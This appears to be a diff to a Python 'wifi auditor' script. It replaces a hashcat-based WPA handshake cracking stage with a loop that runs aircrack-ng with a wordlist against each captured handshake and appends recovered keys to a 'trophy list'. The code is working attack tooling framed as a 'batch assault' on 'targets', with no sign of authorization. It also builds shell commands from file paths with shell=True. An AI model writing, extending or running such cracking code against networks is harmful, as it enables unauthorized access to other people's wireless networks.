@@ -40,7 +40,7 @@ def run_cmd(cmd, check=True):
         return None
 
 def check_dependencies():
-    tools = ["hashcat", "hcxpcapngtool", "airodump-ng", "aireplay-ng", "timeout", "iwconfig"]
+    tools = ["aircrack-ng", "aireplay-ng", "timeout", "iwconfig"]
     missing = [tool for tool in tools if shutil.which(tool) is None]
     if missing:
         log(f"CRITICAL: Missing required tools: {', '.join(missing)}")
@@ -309,79 +309,51 @@ def run_auditor(args):
             return
 
         if captured_caps:
-            log(f"Phase 3: Initiating single-pass batch crack on {len(captured_caps)} handshakes...")
-            batch_hash_file = os.path.join(TEMP_DIR, "batch_hashes.hc22000")
-            if os.path.exists(batch_hash_file): os.remove(batch_hash_file)
-            
-            for cap in captured_caps:
-                log(f"Converting {os.path.basename(cap)} to hc22000 format...")
-                run_cmd(f"hcxpcapngtool -o {batch_hash_file} {cap} < /dev/null > /dev/null 2>&1", check=False)
-
-            if not os.path.exists(batch_hash_file) or os.path.getsize(batch_hash_file) == 0:
-                log("Failed to convert captures to hashcat format.")
-                return
-
-            potfile = "wifi_auditor.potfile"
-            session_name = "wifi_auditor_session"
-            restore_file = f"{session_name}.restore"
-            
-            log(f"Unleashing Hashcat on {len(captured_caps)} targets...")
-            print("\n" + "="*50)
-            print("HANDING OVER TERMINAL TO HASHCAT ENGINE")
-            print("="*50 + "\n")
-            
-            if os.path.exists(restore_file):
-                log("Found interrupted Hashcat session. Resuming...")
-                crack_cmd = f"hashcat --session {session_name} --restore --status --status-timer=1"
-            else:
-                crack_cmd = f"hashcat --session {session_name} -m 22000 {batch_hash_file} {args.wordlist} -w 3 -O --potfile-path {potfile} --status --status-timer=1"
-            
-            try:
-                subprocess.call(crack_cmd, shell=True)
-            except KeyboardInterrupt:
-                print("\n[SYSTEM] Hashcat run interrupted manually.")
+            log(f"Phase 3: Initiating batch crack on {len(captured_caps)} handshakes using Aircrack-ng...")
             
             print("\n" + "="*50)
-            print("HASHCAT ENGINE FINISHED - RESUMING SCRIPT")
+            print("HANDING OVER TERMINAL TO AIRCRACK-NG")
             print("="*50 + "\n")
             
             cracked_count = 0
-            known_cracks = set()
             
-            if os.path.exists(CRACKED_PASSWORDS_FILE):
-                with open(CRACKED_PASSWORDS_FILE, "r") as f:
-                    for line in f:
-                        if " | Key: " in line:
-                            try:
-                                known_cracks.add(line.split(" | ")[1] + line.split(" | Key: ")[1].strip())
-                            except IndexError:
-                                pass
-
-            if os.path.exists(potfile):
-                with open(CRACKED_PASSWORDS_FILE, "a") as cpf:
-                    with open(potfile, "r") as pf:
-                        for line in pf:
-                            line = line.strip()
-                            if not line: continue
-                            parts = line.split(":")
-                            if len(parts) >= 5:
-                                essid_hex = parts[-2]
-                                password = parts[-1]
-                                try:
-                                    essid = bytes.fromhex(essid_hex).decode('utf-8', 'ignore')
-                                except Exception:
-                                    essid = essid_hex
-                                
-                                dup_key = essid + password
-                                if dup_key not in known_cracks:
-                                    log(f"VICTORY! [{essid}] Key found: {password}")
-                                    cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | Key: {password}\n")
-                                    cpf.flush()
-                                    known_cracks.add(dup_key)
-                                    cracked_count += 1
-                                
+            for cap in captured_caps:
+                essid = os.path.basename(cap).split('_')[0] 
+                log(f"Cracking target: {essid}...")
+                
+                temp_key_file = os.path.join(TEMP_DIR, f"{essid}_key.txt")
+                if os.path.exists(temp_key_file):
+                    os.remove(temp_key_file)
+                
+                crack_cmd = f"aircrack-ng -w {args.wordlist} -l {temp_key_file} {cap}"
+                
+                try:
+                    subprocess.call(crack_cmd, shell=True)
+                except KeyboardInterrupt:
+                    print(f"\n[SYSTEM] Aircrack-ng interrupted for {essid}. Moving to next target...")
+                    continue
+                
+                if os.path.exists(temp_key_file):
+                    with open(temp_key_file, 'r') as f:
+                        password = f.read().strip()
+                        
+                    if password:
+                        log(f"VICTORY! [{essid}] Key found: {password}")
+                        with open(CRACKED_PASSWORDS_FILE, "a") as cpf:
+                            cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | Key: {password}\n")
+                        cracked_count += 1
+                    
+                    os.remove(temp_key_file)
+                else:
+                    log(f"Failed to crack {essid}.")
+            
+            print("\n" + "="*50)
+            print("AIRCRACK-NG ENGINE FINISHED - RESUMING SCRIPT")
+            print("="*50 + "\n")
+            
             log(f"Batch assault complete. Passwords recovered: {cracked_count}.")
-            log(f"Trophy list available at: {CRACKED_PASSWORDS_FILE}")
+            if cracked_count > 0:
+                log(f"Trophy list available at: {CRACKED_PASSWORDS_FILE}")
         else:
             log("No handshakes were secured during this foray.")
 
